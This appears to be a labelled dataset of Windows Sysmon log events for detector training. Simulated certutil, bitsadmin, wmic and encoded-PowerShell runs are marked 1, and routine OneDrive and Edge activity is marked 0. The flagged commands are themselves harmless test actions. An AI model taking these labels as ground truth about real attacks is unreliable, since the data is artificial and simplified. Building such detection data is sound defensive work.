"Process Create: RuleName: - UtcTime: 2025-11-27 17:58:48.314 ProcessGuid: {3a35410f-9158-6928-8e0b-000000000b00} ProcessId: 6316 Image: C:\Windows\System32\certutil.exe FileVersion: 10.0.19041.5794 (WinBuild.160101.0800) Description: CertUtil.exe Product: Microsoft? Windows? Operating System Company: Microsoft Corporation OriginalFileName: CertUtil.exe CommandLine: ""C:\Windows\system32\certutil.exe"" -hashfile C:\Windows\win.ini SHA256 CurrentDirectory: C:\Windows\system32\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-9de6-200000000000} LogonId: 0x20E69D TerminalSessionId: 1 IntegrityLevel: High Hashes: MD5=E6384AD54B07F9783135586C71F82D1C,SHA256=FD1670B43E2D9188B12B233780BF043C5A90A67A2C6E3FCDC564A5C246531BC2,IMPHASH=5AFC8346D5AFF4A4862E8A7C91042465 ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00} ParentProcessId: 4396 ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ParentUser: DESKTOP-EJG8QJC\Emil Jinu",1
"Process Create: RuleName: - UtcTime: 2025-11-27 16:50:13.712 ProcessGuid: {3a35410f-8145-6928-6205-000000000b00} ProcessId: 9116 Image: C:\Users\Emil Jinu\AppData\Local\Microsoft\OneDrive\25.209.1026.0002\FileCoAuth.exe FileVersion: 25.209.1026.0002 Description: Microsoft OneDriveFile Co-Authoring Executable Product: Microsoft OneDrive Company: Microsoft Corporation OriginalFileName: FileCoAuth.exe CommandLine: ""C:\Users\Emil Jinu\AppData\Local\Microsoft\OneDrive\25.209.1026.0002\FileCoAuth.exe"" -Embedding CurrentDirectory: C:\Windows\system32\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-c9e6-200000000000} LogonId: 0x20E6C9 TerminalSessionId: 1 IntegrityLevel: Medium Hashes: MD5=2555530533100D80DB696000AC8C32B7,SHA256=68B1A181C12FB04785A4612654B02EA323EB434DF6C99BC3E9C1B1D6C9A0D556,IMPHASH=35E33834A9AD004F756BCDA65DD08C4E ParentProcessGuid: {3a35410f-6567-6928-0d00-000000000b00} ParentProcessId: 848 ParentImage: C:\Windows\System32\svchost.exe ParentCommandLine: C:\Windows\system32\svchost.exe -k DcomLaunch -p ParentUser: NT AUTHORITY\SYSTEM",0
Registry value set: RuleName: T1122 EventType: SetValue UtcTime: 2025-11-27 17:27:43.215 ProcessGuid: {3a35410f-8a0e-6928-1b07-000000000b00} ProcessId: 14228 Image: C:\Users\Emil Jinu\AppData\Local\Microsoft\OneDrive\OneDrive.exe TargetObject: HKU\S-1-5-21-3351607045-2108423416-1727308141-1001_Classes\CLSID\{82CA8DE3-01AD-4CEA-9D75-BE4C51810A9E}\InprocServer32\(Default) Details: C:\Users\Emil Jinu\AppData\Local\Microsoft\OneDrive\25.209.1026.0002\FileSyncShell64.dll User: DESKTOP-EJG8QJC\Emil Jinu,0
"Process Create: RuleName: - UtcTime: 2025-11-27 17:27:57.999 ProcessGuid: {3a35410f-8a1d-6928-3007-000000000b00} ProcessId: 1048 Image: C:\Users\Emil Jinu\AppData\Local\Microsoft\OneDrive\OneDrive.exe FileVersion: 25.209.1026.0002 Description: Microsoft OneDrive Product: Microsoft OneDrive Company: Microsoft Corporation OriginalFileName: OneDrive.exe CommandLine: ""C:\Users\Emil Jinu\AppData\Local\Microsoft\OneDrive\OneDrive.exe"" CurrentDirectory: C:\Windows\system32\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-c9e6-200000000000} LogonId: 0x20E6C9 TerminalSessionId: 1 IntegrityLevel: Medium Hashes: MD5=DDBB2A7A1BA434259B7609DF9C7510A4,SHA256=E00A94C9A23BA34212D40192999BE4B761B2D27F4EA07BDC5A414C949DB79655,IMPHASH=9B64999A42FEBC0CB20DB21F6621FC6F ParentProcessGuid: {3a35410f-88a5-6928-eb06-000000000b00} ParentProcessId: 9468 ParentImage: C:\Windows\explorer.exe ParentCommandLine: explorer.exe ParentUser: DESKTOP-EJG8QJC\Emil Jinu",0
"Process Create: RuleName: - UtcTime: 2025-11-27 18:04:11.382 ProcessGuid: {3a35410f-929b-6928-ef11-000000000b00} ProcessId: 6812 Image: C:\Windows\System32\bitsadmin.exe FileVersion: 7.8.19041.1 (WinBuild.160101.0800) Description: BITS administration utility Product: Microsoft? Windows? Operating System Company: Microsoft Corporation OriginalFileName: bitsadmin.exe CommandLine: ""C:\Windows\system32\bitsadmin.exe"" /resume job15 CurrentDirectory: C:\Windows\system32\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-9de6-200000000000} LogonId: 0x20E69D TerminalSessionId: 1 IntegrityLevel: High Hashes: MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00} ParentProcessId: 4396 ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ParentUser: DESKTOP-EJG8QJC\Emil Jinu",1
Registry value set: RuleName: - EventType: SetValue UtcTime: 2025-11-27 17:19:43.910 ProcessGuid: {3a35410f-882f-6928-aa06-000000000b00} ProcessId: 6864 Image: C:\Users\Emil Jinu\AppData\Local\Microsoft\OneDrive\OneDrive.exe TargetObject: HKU\S-1-5-21-3351607045-2108423416-1727308141-1001_Classes\lnkfile\shellex\ContextMenuHandlers\ FileSyncEx\(Default) Details: {CB3D0F55-BC2C-4C1A-85ED-23ED75B5106B} User: DESKTOP-EJG8QJC\Emil Jinu,0
"Process Create: RuleName: - UtcTime: 2025-11-27 18:01:40.727 ProcessGuid: {3a35410f-9204-6928-b00e-000000000b00} ProcessId: 12572 Image: C:\Windows\System32\wbem\WMIC.exe FileVersion: 10.0.19041.5794 (WinBuild.160101.0800) Description: WMI Commandline Utility Product: Microsoft? Windows? Operating System Company: Microsoft Corporation OriginalFileName: wmic.exe CommandLine: ""C:\Windows\System32\Wbem\WMIC.exe"" process list brief CurrentDirectory: C:\Windows\system32\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-9de6-200000000000} LogonId: 0x20E69D TerminalSessionId: 1 IntegrityLevel: High Hashes: MD5=EBE8CE528A79B5CC0782E8DFDA250600,SHA256=DA603FA720AB43AA6D4D36AA9FDB828DAB9645523EABAAC209AF6451D5B4D757,IMPHASH=527C7C66CDD13D72D793BCA3A417BCBE ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00} ParentProcessId: 4396 ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ParentUser: DESKTOP-EJG8QJC\Emil Jinu",1
"Process Create: RuleName: - UtcTime: 2025-11-27 17:45:30.607 ProcessGuid: {3a35410f-8e3a-6928-f107-000000000b00} ProcessId: 7468 Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe FileVersion: 10.0.19041.3996 (WinBuild.160101.0800) Description: Windows PowerShell Product: Microsoft? Windows? Operating System Company: Microsoft Corporation OriginalFileName: PowerShell.EXE CommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -Command ""Write-Output 'Test 10'"" CurrentDirectory: C:\Windows\system32\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-9de6-200000000000} LogonId: 0x20E69D TerminalSessionId: 1 IntegrityLevel: High Hashes: MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6 ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00} ParentProcessId: 4396 ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ParentUser: DESKTOP-EJG8QJC\Emil Jinu",1
"Process Create: RuleName: - UtcTime: 2025-11-27 17:30:39.527 ProcessGuid: {3a35410f-8abf-6928-8307-000000000b00} ProcessId: 12948 Image: C:\Program Files (x86)\Microsoft\EdgeWebView\Application\142.0.3595.94\msedgewebview2.exe FileVersion: 142.0.3595.94 Description: Microsoft Edge WebView2 Product: Microsoft Edge WebView2 Company: Microsoft Corporation OriginalFileName: msedgewebview2.exe CommandLine: ""C:\Program Files (x86)\Microsoft\EdgeWebView\Application\142.0.3595.94\msedgewebview2.exe"" --type=gpu-process --noerrdialogs --user-data-dir=""C:\Users\Emil Jinu\AppData\Local\Microsoft\OneDrive\EBWebView"" --webview-exe-name=OneDrive.exe --webview-exe-version=25.209.1026.0002 --embedded-browser-webview=1 --embedded-browser-webview-dpi-awareness=1 --no-pre-read-main-dll --gpu-preferences=SAAAAAAAAADgAAAEAAAAAAAAAAAAAGAAAQAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAA== --startup-read-main-dll --metrics-shmem-handle=1744,i,13113797965155775092,17468244489274171743,262144 --field-trial-handle=1900,i,13351592075084674576,17810772990261688213,262144 --enable-features=ForceSWDCompWhenDCompFallbackRequired,LocalNetworkAccessForFencedFrameNavigationsWarningOnly,LocalNetworkAccessForNavigationsWarningOnly,LocalNetworkAccessForSubframeNavigationsWarningOnly,LocalNetworkAccessForWorkersWarningOnly,msAggressiveCacheTrimming,msCustomDataPartition,msWebView2NoTabForScreenShare,msWindowsTaskManager --disable-features=BackForwardCache,BackgroundTabLoadingFromPerformanceManager,CloseOmniboxPopupOnInactiveAreaClick,CollectAVProductsInfo,CollectCodeIntegrityInfo,DeferSpeculativeRFHCreation,EnableHangWatcher,FilterAdsOnAbusiveSites,GetWifiProtocol,LoginDetection,MediaFoundationCameraUsageMonitoring,PreconnectToSearch,PreloadingEagerHeuristics,SafetyHub,SegmentationPlatform,ServiceWorkerAutoPreload,SpareRendererForSitePerProcess,Ukm,WebPayments,msAITrackerClassification,msAbydosForWindowlessWV2,msAffirmVirtualCard,msAllowChromeWebstore,msAllowMSAPrtSSOForNonMSAProfile,msApplicationGuard,msAskBeforeClosingMultipleTabs,msAutoToggleAADPrtSSOForNonAADProfile,msAutofillEdgeServiceRequest,msAutofillEnableEdgeSuggestions,msAutomaticTabFreeze,msBrowserSettingsSupported,msCoarseGeolocationService,msDataProtection,msDesktopMode,msDesktopRewards,msDisableVariationsSeedFetchThrottling,msEEProactiveHistory,msETFOffstoreExtensionFileDataCollection,msETFPasswordTheftDNRActionSignals,msEdgeAdPlatformUI,msEdgeAddWebCapturetoCollections,msEdgeAutofillShowDeployedPassword,msEdgeCaptureSelectionInPDF,msEdgeCloudConfigService,msEdgeCloudConfigServiceV2,msEdgeCohorts,msEdgeCollectionsPrismExperiment1,msEdgeCollectionsPrismOverallMigration,msEdgeComposeNext,msEdgeEnableNurturingFramework,msEdgeEnclavePrefsBasic,msEdgeEnclavePrefsNotification,msEdgeFaviconService,msEdgeHJTelemetry,msEdgeHubAppSkype,msEdgeImageEditorUI,msEdgeLinkDoctor,msEdgeMouseGestureDefaultEnabled,msEdgeMouseGestureSupported,msEdgeNewDeviceFre,msEdgeOnRampFRE,msEdgeOnRampImport,msEdgePDFCMHighlightUX,msEdgePasswordIris,msEdgePasswordIrisSaveBubble,msEdgePasswordStrengthCheck,msEdgePinpointFramework,msEdgeProngPersonalization,msEdgeReadingView,msEdgeRose,msEdgeScreenshotUI,msEdgeSendTabToSelf,msEdgeSettingsImport,msEdgeSettingsImportV2,msEdgeShoppingPersistentStorage,msEdgeShoppingUI,msEdgeSmartFind,msEdgeSuperDragDefaultEnabled,msEdgeSuperDragDropSupported,msEdgeTranslate,msEdgeUpdatesMoreMenuPill,msEdgeWebCapture,msEdgeWebCaptureUniformExperience,msEdgeWebContentFilteringFeedback,msEdgeWorkSearchBanner,msEnableCustomJobMemoryLimitsOnXbox,msEnableMIPForPDF,msEnablePdfUpsell,msEnableThirdPartyScanning,msEnableWebSignInCta,msEnableWebToBrowserSignIn,msEndpointDlp,msEnhancedTrackingPreventionEnabled,msEntityExtraction,msExtensionTelemetryFramework,msExternalTaskManager,msFileSystemAccessDirectoryIterationBlocklistCheck,msForceBrowserSignIn,msForeignSessionsPage,msGeolocationAccessService,msGeolocationOSLocationPermissionFallback,msGeolocationSQMService,msGeolocationService,msGrowthInfraLaunchSourceLogging,msGuidedSwitchAllowed,msHubPinPersist,msImplicitSignin,msIrm,msIrmv2,msKlarnaVirtualCard,msLlmConsumerDlpPurview,msLoadStatistics,msLogIsEdgePinnedToTaskbarOnLaunch,msMIPCrossTenantPdfViewSupport,msMdatpWebSiteDlp,msNotificationPermissionForPWA,msNumberOfSitesToPin,msNurturingGlobalSitePinningOnCloseModal,msNurturingSitePinningCITopSites,msNurturingSitePinningWithWindowsConsent,msOnHoverSearchInSidebar,msOpenOfficeDocumentsInWebViewer,msPageInteractionRestrictionRevoke,msPasswordBreachDetection,msPdfAnnotationsVisibility,msPdfDataRecovery,msPdfDigitalSignatureRead,msPdfFreeText,msPdfFreeTextForCJK,msPdfHighlightMode,msPdfInking,msPdfKeyphraseSupport,msPdfOOUI,msPdfPopupMarkerRenderer,msPdfShare,msPdfSharedLibrary,msPdfTextNote,msPdfTextNoteMoreMenu,msPdfThumbnailCache,msPdfUnderside,msPdfViewRestore,msPersonalizationUMA,msPriceComparison,msPromptDefaultHandlerForPDF,msReactiveSearch,msReadAloud,msReadAloudPdf,msRedirectToShoreline,msRevokeExtensions,msSaasDlp,msShoppingTrigger,msShorelineSearch,msShorelineSearchFindOnPageWebUI,msShowOfflineGameEntrance,msShowReadAloudIconInAddressBar,msShowUXForAADPrtSSOForNonAADProfile,msSitePinningWithoutUi,msSuspendMessageForNewSessionWhenHavingPendingNavigation,msSyncEdgeCollections,msTabResourceStats,msTokenizationAutofillInlineEnabled,msTouchMode,msTriggeringSignalGenerator,msUserUnderstanding,msVideoSuperResolutionUI,msWalletBuyNow,msWalletCheckout,msWalletDiagnosticDataLogger,msWalletHubEntry,msWalletHubIntlP3,msWalletPartialCard,msWalletPasswordCategorization,msWalletPasswordCategorizationPlatformExpansion,msWalletTokenizationCardMetadata,msWalletTokenizedAutofill,msWebAssist,msWebAssistHistorySearchService,msWebOOUI,msWindowsUserActivities,msZipPayVirtualCard --variations-seed-version --trace-process-track-uuid=3190708988185955192 --mojo-platform-channel-handle=1896 /prefetch:2 CurrentDirectory: C:\Program Files (x86)\Microsoft\EdgeWebView\Application\142.0.3595.94\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-c9e6-200000000000} LogonId: 0x20E6C9 TerminalSessionId: 1 IntegrityLevel: Low Hashes: MD5=AB9D05DB45C4F5ACB48984012D529A8C,SHA256=A8DC2D7B26405E4B5173B3516C4E2758699212C2BF29D10F494767ACE06689A9,IMPHASH=4C2A67DEB457B8BF9F317820EE11E05D ParentProcessGuid: {3a35410f-8abf-6928-8107-000000000b00} ParentProcessId: 14668 ParentImage: C:\Program Files (x86)\Microsoft\EdgeWebView\Application\142.0.3595.94\msedgewebview2.exe ParentCommandLine: ""C:\Program Files (x86)\Microsoft\EdgeWebView\Application\142.0.3595.94\msedgewebview2.exe"" --embedded-browser-webview=1 --webview-exe-name=OneDrive.exe --webview-exe-version=25.209.1026.0002 --user-data-dir=""C:\Users\Emil Jinu\AppData\Local\Microsoft\OneDrive\EBWebView"" --noerrdialogs --embedded-browser-webview-dpi-awareness=1 --disable-features=msEnhancedTrackingPreventionEnabled --mojo-named-platform-channel-pipe=9588.9932.9553303398957391596 ParentUser: DESKTOP-EJG8QJC\Emil Jinu",0
Dns query: RuleName: - UtcTime: 2025-11-27 17:07:49.753 ProcessGuid: {3a35410f-8558-6928-5706-000000000b00} ProcessId: 188 QueryName: wpad QueryStatus: 123 QueryResults: - Image: C:\Program Files (x86)\Microsoft\EdgeWebView\Application\142.0.3595.94\msedgewebview2.exe User: DESKTOP-EJG8QJC\Emil Jinu,0
Registry value set: RuleName: T1122 EventType: SetValue UtcTime: 2025-11-27 17:20:09.387 ProcessGuid: {3a35410f-8849-6928-d406-000000000b00} ProcessId: 5100 Image: C:\Users\Emil Jinu\AppData\Local\Microsoft\OneDrive\OneDrive.exe TargetObject: HKU\S-1-5-21-3351607045-2108423416-1727308141-1001_Classes\CLSID\{4410DC33-BC7C-496B-AA84-4AEA3EEE75F7}\InProcServer32\(Default) Details: C:\Users\Emil Jinu\AppData\Local\Microsoft\OneDrive\25.209.1026.0002\FileCoAuthLib64.dll User: DESKTOP-EJG8QJC\Emil Jinu,0
"Process Create: RuleName: - UtcTime: 2025-11-27 18:10:21.664 ProcessGuid: {3a35410f-940d-6928-4016-000000000b00} ProcessId: 6872 Image: C:\Windows\System32\certutil.exe FileVersion: 10.0.19041.5794 (WinBuild.160101.0800) Description: CertUtil.exe Product: Microsoft? Windows? Operating System Company: Microsoft Corporation OriginalFileName: CertUtil.exe CommandLine: ""C:\Windows\system32\certutil.exe"" -hashfile C:\Windows\win.ini SHA256 CurrentDirectory: C:\Users\Emil Jinu\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-c9e6-200000000000} LogonId: 0x20E6C9 TerminalSessionId: 1 IntegrityLevel: Medium Hashes: MD5=E6384AD54B07F9783135586C71F82D1C,SHA256=FD1670B43E2D9188B12B233780BF043C5A90A67A2C6E3FCDC564A5C246531BC2,IMPHASH=5AFC8346D5AFF4A4862E8A7C91042465 ParentProcessGuid: {3a35410f-93eb-6928-6715-000000000b00} ParentProcessId: 6344 ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ParentUser: DESKTOP-EJG8QJC\Emil Jinu",1
"Process Create: RuleName: - UtcTime: 2025-11-27 18:00:06.725 ProcessGuid: {3a35410f-91a6-6928-e60c-000000000b00} ProcessId: 11260 Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe FileVersion: 10.0.19041.3996 (WinBuild.160101.0800) Description: Windows PowerShell Product: Microsoft? Windows? Operating System Company: Microsoft Corporation OriginalFileName: PowerShell.EXE CommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAEUAOQA3ACcA CurrentDirectory: C:\Windows\system32\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-9de6-200000000000} LogonId: 0x20E69D TerminalSessionId: 1 IntegrityLevel: High Hashes: MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6 ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00} ParentProcessId: 4396 ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ParentUser: DESKTOP-EJG8QJC\Emil Jinu",1
Dns query: RuleName: - UtcTime: 2025-11-27 17:29:16.963 ProcessGuid: {3a35410f-8a3c-6928-4f07-000000000b00} ProcessId: 8828 QueryName: cdn.jsdelivr.net QueryStatus: 0 QueryResults: type: 5 cdn.jsdelivr.net.cdn.cloudflare.net;104.16.174.226;104.16.175.226; Image: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe User: DESKTOP-EJG8QJC\Emil Jinu,0
"Registry value set: RuleName: T1060,RunKey EventType: SetValue UtcTime: 2025-11-27 17:31:57.941 ProcessGuid: {3a35410f-8ae9-6928-8907-000000000b00} ProcessId: 7412 Image: C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe TargetObject: HKU\S-1-5-21-3351607045-2108423416-1727308141-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\MicrosoftEdgeAutoLaunch_6292A2F6BF3E9F54EAFEC5C21A7730CB Details: ""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --no-startup-window --win-session-start User: DESKTOP-EJG8QJC\Emil Jinu",0
Registry value set: RuleName: T1122 EventType: SetValue UtcTime: 2025-11-27 17:28:02.936 ProcessGuid: {3a35410f-8a22-6928-3707-000000000b00} ProcessId: 11032 Image: C:\Users\Emil Jinu\AppData\Local\Microsoft\OneDrive\OneDrive.exe TargetObject: HKU\S-1-5-21-3351607045-2108423416-1727308141-1001_Classes\CLSID\{CB3D0F55-BC2C-4C1A-85ED-23ED75B5106B}\InprocServer32\(Default) Details: C:\Users\Emil Jinu\AppData\Local\Microsoft\OneDrive\25.209.1026.0002\FileSyncShell64.dll User: DESKTOP-EJG8QJC\Emil Jinu,0
"Process Create: RuleName: - UtcTime: 2025-11-27 18:03:57.421 ProcessGuid: {3a35410f-928d-6928-6411-000000000b00} ProcessId: 10904 Image: C:\Windows\System32\bitsadmin.exe FileVersion: 7.8.19041.1 (WinBuild.160101.0800) Description: BITS administration utility Product: Microsoft? Windows? Operating System Company: Microsoft Corporation OriginalFileName: bitsadmin.exe CommandLine: ""C:\Windows\system32\bitsadmin.exe"" /create job9 CurrentDirectory: C:\Windows\system32\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-9de6-200000000000} LogonId: 0x20E69D TerminalSessionId: 1 IntegrityLevel: High Hashes: MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00} ParentProcessId: 4396 ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ParentUser: DESKTOP-EJG8QJC\Emil Jinu",1
"Process Create: RuleName: - UtcTime: 2025-11-27 17:01:25.043 ProcessGuid: {3a35410f-83e5-6928-2d06-000000000b00} ProcessId: 2052 Image: C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe FileVersion: 1.3.209.9 Description: Microsoft Edge Update Product: Microsoft Edge Update Company: Microsoft Corporation OriginalFileName: msedgeupdate.dll CommandLine: ""C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe"" /ua /installsource core CurrentDirectory: C:\Program Files (x86)\Microsoft\EdgeUpdate\1.3.209.9\ User: NT AUTHORITY\SYSTEM LogonGuid: {3a35410f-6567-6928-e703-000000000000} LogonId: 0x3E7 TerminalSessionId: 0 IntegrityLevel: System Hashes: MD5=80306EB362C63D6A63F443A3B2B84EDF,SHA256=B0585142D771FD68F0F939B925E4D32B491CD097350131F8F5C006EB8B2B0397,IMPHASH=CD3B2D99C6655A5D4A14E30E380F5BF9 ParentProcessGuid: {3a35410f-6604-6928-0801-000000000b00} ParentProcessId: 1832 ParentImage: C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe ParentCommandLine: ""C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe"" /c ParentUser: NT AUTHORITY\SYSTEM",0
Registry value set: RuleName: T1122 EventType: SetValue UtcTime: 2025-11-27 17:28:02.936 ProcessGuid: {3a35410f-8a22-6928-3707-000000000b00} ProcessId: 11032 Image: C:\Users\Emil Jinu\AppData\Local\Microsoft\OneDrive\OneDrive.exe TargetObject: HKU\S-1-5-21-3351607045-2108423416-1727308141-1001_Classes\WOW6432Node\CLSID\{7AFDFDDB-F914-11E4-8377-6C3BE50D980C}\InprocServer32\(Default) Details: C:\Users\Emil Jinu\AppData\Local\Microsoft\OneDrive\25.209.1026.0002\i386\FileSyncShell.dll User: DESKTOP-EJG8QJC\Emil Jinu,0
File created: RuleName: DLL UtcTime: 2025-11-27 14:57:36.934 ProcessGuid: {3a35410f-656d-6928-5500-000000000b00} ProcessId: 720 Image: C:\Windows\system32\svchost.exe TargetFilename: C:\Program Files\WindowsApps\Microsoft.Windows.DevHome_0.2100.858.0_x64__8wekyb3d8bbwe\WindowsAdvancedSettingsStub\nl-NL\WindowsAdvancedSettings.resources.dll CreationUtcTime: 2025-11-27 14:57:36.934 User: NT AUTHORITY\SYSTEM,0
"Process Create: RuleName: - UtcTime: 2025-11-27 17:48:42.546 ProcessGuid: {3a35410f-8efa-6928-5408-000000000b00} ProcessId: 2960 Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe FileVersion: 10.0.19041.3996 (WinBuild.160101.0800) Description: Windows PowerShell Product: Microsoft? Windows? Operating System Company: Microsoft Corporation OriginalFileName: PowerShell.EXE CommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -Command ""Write-Output 'Test 108'"" CurrentDirectory: C:\Windows\system32\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-9de6-200000000000} LogonId: 0x20E69D TerminalSessionId: 1 IntegrityLevel: High Hashes: MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6 ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00} ParentProcessId: 4396 ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ParentUser: DESKTOP-EJG8QJC\Emil Jinu",1
Process terminated: RuleName: - UtcTime: 2025-11-27 15:34:19.136 ProcessGuid: {3a35410f-6f25-6928-ff03-000000000b00} ProcessId: 13564 Image: C:\Users\Emil Jinu\AppData\Local\Programs\Microsoft VS Code\Code.exe User: DESKTOP-EJG8QJC\Emil Jinu,0
"Process Create: RuleName: - UtcTime: 2025-11-27 18:06:39.512 ProcessGuid: {3a35410f-932f-6928-2915-000000000b00} ProcessId: 17384 Image: C:\Windows\System32\wbem\WMIC.exe FileVersion: 10.0.19041.5794 (WinBuild.160101.0800) Description: WMI Commandline Utility Product: Microsoft? Windows? Operating System Company: Microsoft Corporation OriginalFileName: wmic.exe CommandLine: ""C:\Windows\System32\Wbem\WMIC.exe"" process get name CurrentDirectory: C:\Windows\system32\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-9de6-200000000000} LogonId: 0x20E69D TerminalSessionId: 1 IntegrityLevel: High Hashes: MD5=EBE8CE528A79B5CC0782E8DFDA250600,SHA256=DA603FA720AB43AA6D4D36AA9FDB828DAB9645523EABAAC209AF6451D5B4D757,IMPHASH=527C7C66CDD13D72D793BCA3A417BCBE ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00} ParentProcessId: 4396 ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ParentUser: DESKTOP-EJG8QJC\Emil Jinu",1
"Process Create: RuleName: - UtcTime: 2025-11-27 18:01:55.480 ProcessGuid: {3a35410f-9213-6928-fe0e-000000000b00} ProcessId: 8896 Image: C:\Windows\System32\wbem\WMIC.exe FileVersion: 10.0.19041.5794 (WinBuild.160101.0800) Description: WMI Commandline Utility Product: Microsoft? Windows? Operating System Company: Microsoft Corporation OriginalFileName: wmic.exe CommandLine: ""C:\Windows\System32\Wbem\WMIC.exe"" process list brief CurrentDirectory: C:\Windows\system32\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-9de6-200000000000} LogonId: 0x20E69D TerminalSessionId: 1 IntegrityLevel: High Hashes: MD5=EBE8CE528A79B5CC0782E8DFDA250600,SHA256=DA603FA720AB43AA6D4D36AA9FDB828DAB9645523EABAAC209AF6451D5B4D757,IMPHASH=527C7C66CDD13D72D793BCA3A417BCBE ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00} ParentProcessId: 4396 ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ParentUser: DESKTOP-EJG8QJC\Emil Jinu",1
Registry value set: RuleName: T1122 EventType: SetValue UtcTime: 2025-11-27 17:19:50.672 ProcessGuid: {3a35410f-8836-6928-b106-000000000b00} ProcessId: 6504 Image: C:\Users\Emil Jinu\AppData\Local\Microsoft\OneDrive\OneDrive.exe TargetObject: HKU\S-1-5-21-3351607045-2108423416-1727308141-1001_Classes\WOW6432Node\CLSID\{BBACC218-34EA-4666-9D7A-C78F2274A524}\InprocServer32\(Default) Details: C:\Users\Emil Jinu\AppData\Local\Microsoft\OneDrive\25.209.1026.0002\i386\FileSyncShell.dll User: DESKTOP-EJG8QJC\Emil Jinu,0
